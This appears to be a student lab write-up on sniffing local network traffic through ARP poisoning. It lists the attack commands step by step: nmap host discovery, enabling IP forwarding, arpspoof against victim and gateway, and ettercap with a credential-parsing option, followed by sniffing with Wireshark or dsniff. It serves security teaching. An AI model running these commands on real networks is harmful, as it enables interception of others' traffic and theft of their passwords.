# Experiment-6

## Objective

Perform an Experiment to Sniff Traffic using ARP Poisoning.

## Program

### ARP Poisoning Attack Steps

#### 1. Gather Information

1. **Get victim IP address**, e.g. `192.168.122.183`
   - E.g. through host discovery using Nmap:
     ```bash
     nmap -sn 192.168.0.0/24
     ```

2. **Get default gateway IP**, e.g. `192.168.122.1`
   - Usually IP of the machine ending with `.1`.
   - Usually same for everyone on the same network.
   - Default gateway is the forwarding host (router) to the internet when no other specification matches the destination IP of a packet.

#### 2. Enable Forwarding Mode to Sniff the Traffic

In Linux:

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

> **Note:** Otherwise no traffic is going through and you're just DoSing.

#### 3. Attack

- Deceive the victim device through flooding ARP reply packets to it.
- Change the gateway's MAC address to the attacker's MAC address.
- Use an ARP spoofing tool, e.g.:
  - `arpspoof`
  - `arpspoof -t <victim-machine-ip> <default-gateway-ip>`
  - `arpspoof -t <default-gateway-ip> <victim-machine-ip>`
  - `ettercap`
  - `ettercap -NaC <default-gateway-ip> <victim-machine-ip>`
  - Cain and Abel (Cain & Abel) on Windows.

**Ettercap options:**
- `N`: make it non-interactive.
- `a`: ARP poison.
- `c`: parse out passwords and usernames.
- Ettercap also sniffs passwords automatically.

#### 4. Sniff

- Now you sniff the traffic between two devices.
- If through HTTPS & SSL, you can only see basic data such as User Agent and domain names.
- Can use tools such as Wireshark or dsniff.